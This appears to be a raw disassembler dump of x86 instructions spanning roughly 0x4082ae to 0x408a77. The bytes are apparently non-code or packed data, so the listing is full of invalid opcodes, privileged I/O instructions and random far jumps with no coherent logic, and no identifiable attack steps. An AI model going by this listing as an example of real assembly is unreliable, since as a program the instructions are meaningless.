  4082ae:	nop
  4082af:	lea    edx,[edi+0x59d1c466]
  4082b5:	std    
  4082b6:	xchg   edi,eax
  4082b7:	pop    esi
  4082b8:	pusha  
  4082b9:	icebp  
  4082ba:	cdq    
  4082bb:	test   DWORD PTR [edx-0x2f],edi
  4082be:	push   ss
  4082bf:	(bad)  
  4082c0:	mov    dl,0x96
  4082c2:	xchg   esi,eax
  4082c3:	scas   eax,DWORD PTR es:[edi]
  4082c4:	retf   0x4f2f
  4082c7:	pop    ds
  4082c8:	lods   al,BYTE PTR ds:[esi]
  4082c9:	lods   al,BYTE PTR ds:[esi]
  4082ca:	sub    eax,0xa364428e
  4082cf:	cdq    
  4082d0:	stos   DWORD PTR es:[edi],eax
  4082d1:	in     al,0xeb
  4082d3:	add    eax,0x44a11b74
  4082d8:	daa    
  4082d9:	xlat   BYTE PTR ds:[ebx]
  4082da:	cmp    al,BYTE PTR [ebp+0x1a8754d]
  4082e0:	pop    esi
  4082e1:	lahf   
  4082e2:	fcmovu st,st(6)
  4082e4:	mov    ebp,DWORD PTR [edi-0x1521f84d]
  4082ea:	ret    0xf56f
  4082ed:	lods   eax,DWORD PTR ds:[esi]
  4082ee:	fs es aas 
  4082f1:	stos   DWORD PTR es:[edi],eax
  4082f2:	xchg   ecx,eax
  4082f3:	leave  
  4082f4:	mov    ebx,0x27b6bca8
  4082f9:	and    ecx,DWORD PTR [ebp-0x2c397315]
  4082ff:	sbb    DWORD PTR [ebx],0x7759fc38
  408305:	mov    esp,0xc5cd0e53
  40830a:	push   es
  40830b:	test   DWORD PTR [edx+ebx*8],0xbc7c5e22
  408312:	dec    ebx
  408313:	scas   al,BYTE PTR es:[edi]
  408314:	sar    DWORD PTR [esi+0x52c33cea],0x45
  40831b:	mov    dl,bl
  40831d:	imul   ebp,DWORD PTR [edi+eax*8+0x1079f5c9],0x30
  408325:	inc    ebp
  408326:	ds enter 0x139a,0x7d
  40832b:	or     DWORD PTR [edx-0x71],edi
  40832e:	adc    al,0x5b
  408330:	xchg   ebx,eax
  408331:	mov    ah,0x75
  408333:	pop    ds
  408334:	xor    al,0xec
  408336:	jmp    0x34d0:0xb45e7614
  40833d:	(bad)  
  40833e:	pushf  
  40833f:	ja     0x4082dc
  408341:	cmp    ch,BYTE PTR [esi-0x37]
  408344:	add    ebp,edi
  408346:	push   esi
  408347:	fisub  WORD PTR [edi-0x16]
  40834a:	jmp    0x7bb9ba0f
  40834f:	jo     0x408347
  408351:	fbstp  TBYTE PTR [edx+esi*2+0x79a84f94]
  408358:	mov    esp,0x5e3cdedc
  40835d:	mov    ebp,0xb5ade6f3
  408362:	inc    esp
  408363:	out    0x4b,eax
  408365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408366:	push   es
  408367:	sub    DWORD PTR [ebp-0x5188498d],esi
  40836d:	rcr    DWORD PTR [ecx+ecx*2],cl
  408370:	call   0xcb2c:0x1fb17286
  408377:	shl    esi,1
  408379:	leave  
  40837a:	sbb    eax,0x727ce640
  40837f:	pushf  
  408380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408381:	cmp    ah,ah
  408383:	mov    esp,0xb4eb12c4
  408388:	jp     0x40837e
  40838a:	rol    ch,1
  40838c:	mov    dl,0x93
  40838e:	hlt    
  40838f:	jno    0x4083e1
  408391:	(bad)  
  408392:	fnstsw WORD PTR [ecx+0x1e259728]
  408398:	xchg   ebx,eax
  408399:	test   DWORD PTR [eax*8+0x440d2555],edx
  4083a0:	outs   dx,DWORD PTR ds:[esi]
  4083a1:	arpl   cx,sp
  4083a3:	mov    edi,0xea6dc5e0
  4083a8:	cmp    bh,BYTE PTR [ebx]
  4083aa:	cmp    al,0xa0
  4083ac:	mov    ah,0xc1
  4083ae:	mov    bl,0x81
  4083b0:	lods   al,BYTE PTR ds:[esi]
  4083b1:	sbb    DWORD PTR [ecx-0x608090a1],ecx
  4083b7:	bound  ebp,QWORD PTR [ecx+0x3f3861df]
  4083bd:	std    
  4083be:	jnp    0x40841d
  4083c0:	jne    0x408371
  4083c2:	pushf  
  4083c3:	jno    0x408351
  4083c5:	push   ebp
  4083c6:	push   es
  4083c7:	fwait
  4083c8:	inc    ebp
  4083c9:	add    bh,BYTE PTR ds:0xec4bc59c
  4083cf:	js     0x40835f
  4083d1:	push   es
  4083d2:	sbb    eax,0x7e68b6b
  4083d7:	lods   eax,DWORD PTR ds:[esi]
  4083d8:	js     0x40839f
  4083da:	jnp    0x40838d
  4083dc:	xor    al,0xe
  4083de:	iret   
  4083df:	jo     0x4083a4
  4083e1:	and    al,0x0
  4083e3:	or     eax,0x246e7889
  4083e8:	adc    eax,eax
  4083ea:	test   al,0xf8
  4083ec:	pop    eax
  4083ed:	dec    esi
  4083ee:	sbb    al,0xf0
  4083f0:	cmp    ebp,DWORD PTR [ebx-0x2a]
  4083f3:	xor    eax,0xefe088a5
  4083f8:	adc    DWORD PTR ds:0xec369e7a,edi
  4083fe:	call   0x7897:0xd9291af7
  408405:	faddp  st(6),st
  408407:	inc    esi
  408408:	sbb    DWORD PTR [eax+0x6644c2d9],0xffffff95
  40840f:	xor    eax,0xfe54ef04
  408414:	pop    esi
  408415:	mov    ds:0x94afd38e,eax
  40841a:	add    eax,0xa5d77ed9
  40841f:	lea    esp,[edx]
  408421:	jne    0x4083d4
  408423:	push   ecx
  408424:	jg     0x408461
  408426:	cmc    
  408427:	mov    al,0x95
  408429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40842a:	adc    BYTE PTR [eax+0x73],ah
  40842d:	jmp    0x4084a3
  40842f:	cmp    BYTE PTR [ebx],ah
  408431:	in     al,dx
  408432:	in     al,dx
  408433:	fcmovb st,st(1)
  408435:	jmp    0xd92b:0x89be303b
  40843c:	cmp    ebp,esp
  40843e:	mov    ds:0x9fbf0182,al
  408443:	dec    ebp
  408444:	test   al,0x46
  408446:	mov    ds:0x27afb851,al
  40844b:	fdivrp st(7),st
  40844d:	push   edx
  40844e:	outs   dx,DWORD PTR ds:[esi]
  40844f:	pop    ebx
  408450:	les    eax,FWORD PTR ds:0x25747a22
  408456:	mov    ecx,0x94151c17
  40845b:	dec    esp
  40845c:	(bad)  
  40845d:	pusha  
  40845e:	in     al,0xe2
  408460:	sub    cl,BYTE PTR [eax+0x524fa8ce]
  408466:	ss push edi
  408468:	inc    esi
  408469:	xchg   edi,eax
  40846a:	dec    ebx
  40846b:	arpl   WORD PTR [ebx-0x2fd81c21],si
  408471:	ficom  WORD PTR [edx-0x3f5fa3d8]
  408477:	data16 xchg ch,dh
  40847a:	mov    esi,esi
  40847c:	retf   
  40847d:	cmp    eax,0x79865719
  408482:	push   ecx
  408483:	int3   
  408484:	enter  0x4ed1,0x3e
  408488:	js     0x408507
  40848a:	sub    DWORD PTR [edi-0x3a],0xffffff8d
  40848e:	repz loop 0x408481
  408491:	pop    esp
  408492:	pop    es
  408493:	out    dx,al
  408494:	add    esp,ebp
  408496:	outs   dx,DWORD PTR ds:[esi]
  408497:	jns    0x408445
  408499:	sti    
  40849a:	pushf  
  40849b:	pop    ebp
  40849c:	adc    esp,DWORD PTR [esi+0x5b]
  40849f:	pop    edx
  4084a0:	xor    al,0x3f
  4084a2:	fisubr WORD PTR [ebx+0x23]
  4084a5:	sub    esp,DWORD PTR [edx-0x59]
  4084a8:	pop    edx
  4084a9:	popa   
  4084aa:	in     eax,0x3e
  4084ac:	mov    ecx,0x3c3864c5
  4084b1:	push   esp
  4084b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084b3:	popf   
  4084b4:	mov    ch,BYTE PTR [eax]
  4084b6:	or     bh,bh
  4084b8:	xchg   edi,eax
  4084b9:	loop   0x4084a5
  4084bb:	aad    0xa3
  4084bd:	sar    BYTE PTR [eax-0x1e],0xd3
  4084c1:	icebp  
  4084c2:	in     al,0xbd
  4084c4:	(bad)  
  4084c5:	(bad)  
  4084c6:	pop    ds
  4084c7:	shl    DWORD PTR [edi+0x77],1
  4084ca:	ja     0x408465
  4084cc:	and    al,0xa
  4084ce:	mov    eax,ds:0x84b1cbc0
  4084d3:	jp     0x40852c
  4084d5:	lods   al,BYTE PTR ds:[esi]
  4084d6:	enter  0x968d,0xc4
  4084da:	lods   eax,DWORD PTR ds:[esi]
  4084db:	jno    0x4084f7
  4084dd:	lods   al,BYTE PTR ds:[esi]
  4084de:	push   cs
  4084df:	fidivr DWORD PTR [bx+di+0x4c87]
  4084e4:	mov    al,0x67
  4084e6:	and    DWORD PTR [ebx+0x2d476e4b],ecx
  4084ec:	dec    edx
  4084ed:	push   eax
  4084ee:	imul   ecx,DWORD PTR [edx],0xfffffffa
  4084f1:	sub    al,0x92
  4084f3:	cwde   
  4084f4:	xchg   ebx,eax
  4084f5:	outs   dx,DWORD PTR ds:[esi]
  4084f6:	imul   edx,DWORD PTR [eax],0x3f19023c
  4084fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084fd:	stc    
  4084fe:	aad    0x88
  408500:	xchg   ebp,eax
  408501:	xchg   ebp,eax
  408502:	mov    edx,0xd8bc9138
  408507:	push   0x2e
  408509:	mov    dl,0xcf
  40850b:	adc    eax,0xfa25497d
  408510:	sub    cl,BYTE PTR [ebx-0xf4c889a]
  408516:	dec    ecx
  408517:	push   edx
  408518:	mov    dl,0x39
  40851a:	pop    edi
  40851b:	lahf   
  40851c:	iret   
  40851d:	fdivr  QWORD PTR [esi]
  40851f:	mov    bh,0x6d
  408521:	xchg   esi,eax
  408522:	jbe    0x408588
  408524:	mov    DWORD PTR [edi-0x36],edi
  408527:	scas   al,BYTE PTR es:[edi]
  408528:	lahf   
  408529:	fwait
  40852a:	lahf   
  40852b:	adc    BYTE PTR [ebx+0x66],cl
  40852e:	arpl   WORD PTR [ebx+0x23],di
  408531:	into   
  408532:	rol    BYTE PTR ds:0xd703ba5c,0x12
  408539:	stc    
  40853a:	mov    ah,bh
  40853c:	cmp    cl,BYTE PTR [ebx]
  40853e:	cmp    BYTE PTR [ebp+0x270d59bb],bh
  408544:	adc    esi,DWORD PTR [ecx-0x25d88e14]
  40854a:	fisttp QWORD PTR [ecx+0x61]
  40854d:	pop    edi
  40854e:	idiv   DWORD PTR [ecx-0x78]
  408551:	in     al,0x60
  408553:	js     0x40857a
  408555:	gs inc eax
  408557:	cmp    edi,ebx
  408559:	les    esi,FWORD PTR [edi-0x6f0a8d07]
  40855f:	mov    ecx,0x1c9e3346
  408564:	and    al,bl
  408566:	cs xor edx,ebp
  408569:	fcom   QWORD PTR [edi+esi*4+0x78]
  40856d:	fsubr  st(6),st
  40856f:	fld    st(2)
  408571:	lods   eax,DWORD PTR ds:[esi]
  408572:	push   es
  408573:	xor    DWORD PTR [edx],ebx
  408575:	ins    DWORD PTR es:[edi],dx
  408576:	mov    bl,0x84
  408578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408579:	adc    ebp,DWORD PTR [eax]
  40857b:	adc    eax,0x8873d01
  408580:	int3   
  408581:	call   0xb6f2d26a
  408586:	adc    BYTE PTR [edi-0x109bbbb9],dh
  40858c:	in     al,dx
  40858d:	popf   
  40858e:	cs imul edx,ecx,0xffffffc5
  408592:	fidiv  WORD PTR [esp+esi*8]
  408595:	push   es
  408596:	sbb    BYTE PTR [ecx-0x14],bh
  408599:	ret    
  40859a:	jmp    0x5e3f:0xc71c9131
  4085a1:	mov    ah,0x96
  4085a3:	stc    
  4085a4:	sti    
  4085a5:	xor    BYTE PTR [eax+0x4f8d847],bl
  4085ab:	bnd jp 0x40853c
  4085ae:	jp     0x40860f
  4085b0:	loope  0x40857d
  4085b2:	out    0x1b,eax
  4085b4:	cmp    al,0xf9
  4085b6:	jmp    0xa85ccb74
  4085bb:	stos   DWORD PTR es:[edi],eax
  4085bc:	xor    al,0xda
  4085be:	mov    esp,0x4368b543
  4085c3:	xor    al,0x2d
  4085c5:	pop    edi
  4085c6:	push   cs
  4085c7:	push   ss
  4085c8:	iret   
  4085c9:	inc    ecx
  4085ca:	sbb    bl,BYTE PTR [eax]
  4085cc:	frstor [edi-0xf]
  4085cf:	std    
  4085d0:	das    
  4085d1:	fwait
  4085d2:	dec    edi
  4085d3:	or     eax,0x1a46026e
  4085d8:	adc    eax,0xe34f22b9
  4085dd:	dec    eax
  4085de:	lods   eax,DWORD PTR ds:[esi]
  4085df:	sbb    eax,edi
  4085e1:	dec    esi
  4085e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e3:	pop    esi
  4085e4:	mov    edx,DWORD PTR [eax+0x50]
  4085e7:	jb     0x40864e
  4085e9:	ss retf 0x5b45
  4085ed:	mov    al,0x9d
  4085ef:	push   es
  4085f0:	cmc    
  4085f1:	sar    DWORD PTR [ebx+0x1840f827],1
  4085f7:	fidiv  DWORD PTR [esp+ecx*2]
  4085fa:	sbb    edi,DWORD PTR ds:0xdb7f0009
  408600:	cmc    
  408601:	je     0x408679
  408603:	cwde   
  408604:	pop    edi
  408605:	and    al,0x45
  408607:	test   ch,cl
  408609:	push   0x767efc56
  40860e:	adc    ebp,DWORD PTR [edi+0xb0b977e]
  408614:	adc    bh,BYTE PTR [esi+ebx*2]
  408617:	mov    cl,0xf5
  408619:	sbb    edi,DWORD PTR [ebx]
  40861b:	xchg   ebx,eax
  40861c:	neg    ch
  40861e:	stos   DWORD PTR es:[edi],eax
  40861f:	(bad)  
  408620:	mov    edx,0x7777603f
  408625:	or     BYTE PTR [edi],dl
  408627:	sub    BYTE PTR [edi],dl
  408629:	mov    edx,0xc25bb8d1
  40862e:	mov    ebp,0x8b0abb2f
  408633:	out    0xa2,al
  408635:	fcmove st,st(1)
  408637:	cmp    edi,DWORD PTR [eax+0x28552a43]
  40863d:	pusha  
  40863e:	ror    ebx,0x36
  408641:	adc    DWORD PTR [esi+0xc1dfb35],ebp
  408647:	sub    bl,BYTE PTR [ebp+0x5f]
  40864a:	arpl   WORD PTR [ebp-0x75da0be9],di
  408650:	xor    BYTE PTR [eax],dl
  408652:	cmp    ebp,DWORD PTR [edx]
  408654:	mov    edx,0x1377af52
  408659:	cwde   
  40865a:	and    DWORD PTR [ecx+0x6cc0e11d],edx
  408660:	xlat   BYTE PTR es:[ebx]
  408662:	pop    ebp
  408663:	(bad)  [esi+edi*2]
  408666:	jmp    0x9597:0xa44eff44
  40866d:	jl     0x4086bb
  40866f:	mov    ah,BYTE PTR [edi+ebp*2-0x228cb086]
  408676:	adc    ebx,DWORD PTR [esi-0xa9eff27]
  40867c:	loope  0x408683
  40867e:	aaa    
  40867f:	std    
  408680:	ret    
  408681:	icebp  
  408682:	push   eax
  408683:	sub    BYTE PTR [edx-0x6b],dh
  408686:	out    dx,al
  408687:	aam    0x87
  408689:	push   ebx
  40868a:	cwde   
  40868b:	fcom   QWORD PTR [edi-0x84553bf]
  408691:	shl    DWORD PTR [edx+0x1e],0x86
  408695:	dec    esp
  408696:	rcl    DWORD PTR [ebx+0x69d7cced],1
  40869c:	ret    0xdb19
  40869f:	repz pop ebp
  4086a1:	dec    ecx
  4086a2:	add    eax,0xa396183
  4086a7:	pop    es
  4086a8:	shl    DWORD PTR [ecx+esi*8],0xf5
  4086ac:	xchg   esp,eax
  4086ad:	and    ecx,DWORD PTR ds:0x92d0f026
  4086b3:	adc    esp,ecx
  4086b5:	cmp    eax,0x1665bf5e
  4086ba:	adc    BYTE PTR [ebx-0x4b4c8064],0x8c
  4086c1:	push   esi
  4086c2:	cdq    
  4086c3:	push   0x9294cbb2
  4086c8:	ins    BYTE PTR es:[edi],dx
  4086c9:	mov    dl,0x5a
  4086cb:	lods   eax,DWORD PTR ds:[esi]
  4086cc:	adc    edx,edx
  4086ce:	mov    esp,0x9d189ada
  4086d3:	adc    al,BYTE PTR [ebx]
  4086d5:	inc    ebx
  4086d6:	add    BYTE PTR [ebx],dh
  4086d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d9:	dec    ecx
  4086da:	or     DWORD PTR [ecx+edi*1],esi
  4086dd:	dec    ecx
  4086de:	jae    0x40868e
  4086e0:	sub    DWORD PTR [ebx-0x58fe6e11],eax
  4086e6:	cmp    esp,DWORD PTR [ecx+0x50]
  4086e9:	inc    eax
  4086ea:	test   DWORD PTR [esi],ecx
  4086ec:	scas   eax,DWORD PTR es:[edi]
  4086ed:	add    al,0x38
  4086ef:	dec    esp
  4086f0:	sbb    DWORD PTR [esi+eax*2],0x98d36420
  4086f7:	jmp    0x4f2ba685
  4086fc:	fbstp  TBYTE PTR [ebp+0x4360ff2b]
  408702:	data16 (bad) 
  408705:	or     BYTE PTR ds:0x1417cb71,ah
  40870b:	test   eax,0x842f245f
  408710:	std    
  408711:	fidiv  WORD PTR ds:0x507d1cf9
  408717:	test   WORD PTR [ebp+0x6a],bx
  40871b:	out    0xa9,al
  40871d:	arpl   dx,dx
  40871f:	scas   al,BYTE PTR es:[edi]
  408720:	mov    edi,0xc6c60bfe
  408725:	std    
  408726:	repnz shl DWORD PTR [esi],cl
  408729:	fs or  al,0x73
  40872c:	jp     0x408731
  40872e:	jne    0x4086b9
  408730:	mov    ds:0x7b38a0c8,al
  408735:	in     eax,0xc6
  408737:	out    dx,eax
  408738:	repnz arpl WORD PTR ss:[edx+ebp*2],cx
  40873d:	mov    bl,0x53
  40873f:	xlat   BYTE PTR ds:[ebx]
  408740:	test   eax,0x5c88240b
  408745:	cmp    al,0x3f
  408747:	jns    0x40876b
  408749:	add    BYTE PTR [edi],cl
  40874b:	mov    al,BYTE PTR [edi]
  40874d:	push   ss
  40874e:	fs in  eax,0x58
  408751:	jbe    0x4087bc
  408753:	ja     0x4087d3
  408755:	fidivr WORD PTR [edx+eiz*2]
  408758:	cs inc eax
  40875a:	dec    esi
  40875b:	cmp    DWORD PTR [ebp-0x60eb7d45],0xffffffac
  408762:	push   ebx
  408763:	push   ecx
  408764:	and    cl,bl
  408766:	dec    ebx
  408767:	loop   0x40877a
  408769:	adc    DWORD PTR [eax-0x44ad52b4],0x491edf29
  408773:	jns    0x408708
  408775:	xchg   esp,eax
  408776:	fld1   
  408778:	cs mov bl,0xb5
  40877b:	add    DWORD PTR fs:[ecx+0x46],esi
  40877f:	out    0xd7,eax
  408781:	sar    DWORD PTR [eax-0xe],cl
  408784:	inc    esi
  408785:	adc    bh,BYTE PTR [ecx]
  408787:	xor    eax,0x8ab67c4a
  40878c:	or     eax,DWORD PTR [edx]
  40878e:	xchg   ecx,eax
  40878f:	jg     0x40876e
  408791:	loopne 0x40877c
  408793:	ins    DWORD PTR es:[edi],dx
  408794:	dec    ebp
  408795:	ins    BYTE PTR es:[edi],dx
  408796:	inc    esi
  408797:	iret   
  408798:	shl    cl,0xff
  40879b:	inc    esi
  40879c:	cmp    edx,DWORD PTR [esi+0x69]
  40879f:	sub    ch,BYTE PTR [edi+0x3a2be204]
  4087a5:	ins    DWORD PTR es:[edi],dx
  4087a6:	mov    dh,0x46
  4087a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087a9:	fisub  DWORD PTR [ebx+0x78]
  4087ac:	gs out dx,al
  4087ae:	repz scas eax,DWORD PTR es:[edi]
  4087b0:	adc    al,bl
  4087b2:	fwait
  4087b3:	sbb    eax,0xf705561a
  4087b8:	sbb    BYTE PTR [ebx+0x790205bb],cl
  4087be:	jo     0x40876c
  4087c0:	retf   0x2217
  4087c3:	pand   mm3,QWORD PTR [ebp+0x47]
  4087c7:	gs retf 
  4087c9:	out    0x85,al
  4087cb:	mov    ds:0xcf642f8e,eax
  4087d0:	out    0xd8,eax
  4087d2:	call   0xe44d:0x27320563
  4087d9:	pop    edi
  4087da:	mov    esp,0x7db4db9
  4087df:	scas   eax,DWORD PTR es:[edi]
  4087e0:	shl    DWORD PTR [edx],1
  4087e2:	sahf   
  4087e3:	pop    eax
  4087e4:	pop    eax
  4087e5:	pop    ss
  4087e6:	push   ss
  4087e7:	pop    es
  4087e8:	mov    ebx,0xbd795a00
  4087ed:	pop    ecx
  4087ee:	push   ebp
  4087f0:	ja     0x4087d9
  4087f2:	pop    esp
  4087f3:	mov    ebp,0x533f1dac
  4087f8:	mov    ch,0x96
  4087fa:	out    dx,eax
  4087fb:	popf   
  4087fc:	and    eax,0x7bfe43a5
  408801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408802:	jge    0x40881c
  408804:	loop   0x408789
  408806:	and    DWORD PTR [esi-0x25460d40],edi
  40880c:	test   DWORD PTR ds:0x6e117e42,0x6c3bfe09
  408816:	mov    edi,0xefdfdf12
  40881b:	les    ebx,FWORD PTR [ecx-0x75]
  40881e:	jbe    0x4087e9
  408820:	push   ebp
  408821:	mov    cl,0x17
  408823:	mov    eax,0xc0f287b2
  408828:	fbstp  TBYTE PTR [ebx]
  40882a:	xlat   BYTE PTR ds:[ebx]
  40882b:	mov    cl,0xcf
  40882d:	pop    esi
  40882e:	stos   DWORD PTR es:[edi],eax
  40882f:	jnp    0x4087c8
  408831:	jle    0x408885
  408833:	xor    cl,BYTE PTR [edx-0x6f46f680]
  408839:	cdq    
  40883a:	mov    ebp,0x55d6168b
  40883f:	(bad)  
  408840:	ds push ss
  408842:	fcmovne st,st(1)
  408844:	mov    eax,0xd934d0cb
  408849:	stc    
  40884a:	mov    DWORD PTR [esi+0x1451d2fd],eax
  408850:	arpl   WORD PTR ds:0x3f24c334,ax
  408856:	mov    WORD PTR [esi-0x77068f07],?
  40885c:	aad    0xa
  40885e:	jmp    0xd3053a8
  408863:	mov    ds:0x28fe600c,al
  408868:	mov    eax,ds:0x19803a44
  40886d:	or     BYTE PTR [edi],bh
  40886f:	stos   DWORD PTR es:[edi],eax
  408870:	fcom   QWORD PTR [ebx-0x6785b4d9]
  408876:	fwait
  408877:	in     al,dx
  408878:	outs   dx,BYTE PTR ds:[esi]
  408879:	dec    ecx
  40887a:	adc    eax,0xc7105d46
  40887f:	lods   eax,DWORD PTR cs:[esi]
  408881:	sti    
  408882:	mov    eax,0x97ac29e9
  408887:	stos   DWORD PTR es:[edi],eax
  408888:	daa    
  408889:	pop    edx
  40888a:	outs   dx,DWORD PTR ds:[esi]
  40888b:	push   eax
  40888c:	sbb    al,0xee
  40888e:	xchg   ebx,eax
  40888f:	pop    es
  408890:	imul   ebp,DWORD PTR ss:[ebx],0x5f5aea59
  408897:	cmp    al,0x19
  408899:	aam    0x38
  40889b:	mov    esi,0x71c26eb5
  4088a0:	push   edx
  4088a1:	stos   BYTE PTR es:[edi],al
  4088a2:	dec    ebp
  4088a3:	popf   
  4088a4:	test   DWORD PTR [esi+0x65],eax
  4088a7:	test   al,0xf8
  4088a9:	out    dx,eax
  4088aa:	call   0xe1ff49a7
  4088af:	push   esi
  4088b0:	xor    al,0x8f
  4088b2:	mov    al,ds:0xa9b4b9d0
  4088b7:	inc    esi
  4088b8:	rol    DWORD PTR [edi],1
  4088ba:	stos   BYTE PTR es:[edi],al
  4088bb:	test   DWORD PTR [ebx+0x12],0xc8628cbf
  4088c2:	mov    dl,0x49
  4088c4:	push   cs
  4088c5:	into   
  4088c6:	ss push ds
  4088c8:	fistp  QWORD PTR [edx+ebp*4+0x5f9fb381]
  4088cf:	int    0xec
  4088d1:	sub    al,0x34
  4088d3:	jmp    0x408905
  4088d5:	(bad)  
  4088d7:	push   0x1c
  4088d9:	push   eax
  4088da:	xchg   esp,eax
  4088db:	daa    
  4088dc:	add    eax,0xda3c91c6
  4088e1:	shl    DWORD PTR [edx+0x1e8c166],cl
  4088e7:	clc    
  4088e8:	mov    ds:0xd928eece,eax
  4088ed:	sahf   
  4088ee:	daa    
  4088ef:	mov    ch,0xc8
  4088f1:	dec    ebp
  4088f2:	ja     0x408971
  4088f4:	and    ch,cl
  4088f6:	popa   
  4088f7:	jbe    0x40895e
  4088f9:	pop    edx
  4088fa:	stos   BYTE PTR es:[edi],al
  4088fb:	outs   dx,DWORD PTR ds:[esi]
  4088fc:	xlat   BYTE PTR ds:[ebx]
  4088fd:	push   cs
  4088fe:	jle    0x40893c
  408900:	sub    BYTE PTR [ecx+0x1e7a9594],al
  408906:	pop    DWORD PTR [edi]
  408908:	cmp    eax,0x2e2f389e
  40890d:	push   esi
  40890e:	repnz daa 
  408910:	dec    ebx
  408911:	pop    esi
  408912:	jge    0x40897e
  408914:	mov    ds:0x7c6aab4a,eax
  408919:	(bad)  
  40891a:	stc    
  40891b:	into   
  40891c:	fidiv  WORD PTR [edx+edi*4-0x7d]
  408920:	retf   
  408921:	or     DWORD PTR [ecx+0x1cbd2d61],0xffffffa9
  408928:	cdq    
  408929:	or     DWORD PTR [edx+0xa641bfe],0xffffff9f
  408930:	cmc    
  408931:	or     BYTE PTR ds:0xa41a3e08,0x27
  408938:	popf   
  408939:	bound  edx,QWORD PTR [esi+0x5559e776]
  40893f:	inc    ebx
  408940:	dec    edx
  408941:	mov    DWORD PTR [ebp+0x70],edx
  408944:	ror    DWORD PTR [esi],1
  408946:	sbb    eax,0xfcbc5260
  40894b:	cli    
  40894c:	js     0x4088eb
  40894e:	jmp    0x57fe4997
  408953:	pop    esi
  408954:	arpl   WORD PTR [ecx-0x1787313c],bp
  40895a:	(bad)  
  40895b:	shl    BYTE PTR [ebp-0x7dfc1ab7],0xe8
  408962:	sub    esp,DWORD PTR [edi+0x4e8adabd]
  408968:	fbld   TBYTE PTR [edi-0x1f]
  40896b:	sbb    edi,DWORD PTR [esi+0x50]
  40896e:	rcl    DWORD PTR [edx-0xd8cf7d6],1
  408974:	pop    edx
  408975:	retf   
  408976:	jnp    0x4089db
  408978:	xor    DWORD PTR [ebp-0x29f68b77],ebp
  40897e:	inc    esi
  40897f:	or     ebp,DWORD PTR [edi-0x46bb088e]
  408985:	mov    dl,BYTE PTR [ebx]
  408987:	mov    ah,0x4e
  408989:	in     eax,dx
  40898a:	jg     0x408926
  40898c:	dec    ebx
  40898d:	push   eax
  40898e:	push   es
  40898f:	fs xchg esi,eax
  408991:	outs   dx,BYTE PTR ds:[esi]
  408992:	bound  edx,QWORD PTR [ecx-0x62]
  408995:	mov    ecx,0xd818754b
  40899a:	adc    esi,DWORD PTR [ecx-0x26]
  40899d:	pop    es
  40899e:	dec    edx
  40899f:	out    dx,eax
  4089a0:	test   BYTE PTR [eax+edx*2],ch
  4089a3:	retf   
  4089a4:	push   esi
  4089a5:	inc    eax
  4089a6:	inc    esp
  4089a7:	and    al,0x2c
  4089a9:	add    BYTE PTR gs:[ebp-0x22],0x7f
  4089ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089af:	sbb    BYTE PTR [esi+edx*2-0x1c44188c],cl
  4089b6:	call   0x86a67609
  4089bb:	mov    edx,0x3e6a4083
  4089c0:	or     eax,0x6f9111f5
  4089c5:	ss and esp,ecx
  4089c8:	iret   
  4089c9:	shl    BYTE PTR [edx],cl
  4089cb:	das    
  4089cc:	outs   dx,DWORD PTR ds:[esi]
  4089cd:	sub    BYTE PTR [edx-0x53301629],ch
  4089d3:	fbld   TBYTE PTR [edx-0x6f]
  4089d6:	add    BYTE PTR [edi-0x20],0x77
  4089da:	in     al,dx
  4089db:	mov    ebp,0xfe3b4007
  4089e0:	xor    edi,DWORD PTR [esi+0x5424b16b]
  4089e6:	push   ebp
  4089e7:	adc    bh,BYTE PTR [eax]
  4089e9:	repnz pop ebx
  4089eb:	push   cs
  4089ec:	cli    
  4089ed:	rcl    DWORD PTR [ebx-0x40],0xa8
  4089f1:	mov    cs,ebx
  4089f3:	fimul  DWORD PTR [esi+esi*4-0x4a]
  4089f7:	fs pop ss
  4089f9:	xchg   DWORD PTR [esp+ebx*2],esp
  4089fc:	shl    BYTE PTR [eax+0x44],cl
  4089ff:	mov    dh,BYTE PTR [ebx-0x30]
  408a02:	jmp    0x8b062b80
  408a07:	retf   
  408a08:	clc    
  408a09:	mov    eax,0x97edf92
  408a0e:	pop    esp
  408a0f:	jp     0x408a33
  408a11:	jg     0x4089e2
  408a13:	push   ebp
  408a14:	pop    eax
  408a15:	sub    esp,DWORD PTR ds:0x29f8b269
  408a1b:	out    0xa2,eax
  408a1d:	jecxz  0x4089bb
  408a1f:	mov    al,ds:0xfb94f59c
  408a24:	push   cs
  408a25:	xor    BYTE PTR [edx],ah
  408a27:	lock aaa 
  408a29:	push   es
  408a2a:	add    bh,BYTE PTR [ecx+0x6d]
  408a2d:	shl    DWORD PTR [ebp-0x63],cl
  408a30:	push   esp
  408a31:	adc    ecx,DWORD PTR [edi+0x47]
  408a34:	xchg   BYTE PTR [esi],dl
  408a36:	pop    esp
  408a37:	inc    edi
  408a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a39:	cwde   
  408a3a:	xchg   esi,eax
  408a3b:	sbb    eax,0xe70768cf
  408a40:	sbb    ecx,DWORD PTR [ebx+eax*1]
  408a43:	sbb    DWORD PTR [edi+ebx*1+0x5f],esi
  408a47:	loope  0x408ab8
  408a49:	dec    eax
  408a4a:	cld    
  408a4b:	xchg   BYTE PTR ds:0x9e382797,cl
  408a51:	test   al,0xaa
  408a53:	add    eax,0x5fbda404
  408a58:	mov    ebp,0xf21f7d56
  408a5d:	xchg   esi,eax
  408a5e:	out    dx,al
  408a5f:	xor    al,0xd6
  408a61:	jno    0x408a31
  408a63:	inc    esi
  408a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a65:	and    al,0x84
  408a67:	sbb    ch,BYTE PTR [eax]
  408a69:	or     dl,bl
  408a6b:	jne    0x408a95
  408a6d:	into   
  408a6e:	xor    BYTE PTR [ecx+0x7b],al
  408a71:	jbe    0x408aec
  408a73:	inc    edi
  408a74:	clc    
  408a75:	push   ds
  408a76:	push   es
  408a77:	mov    WORD PTR [esi-0x19],ds
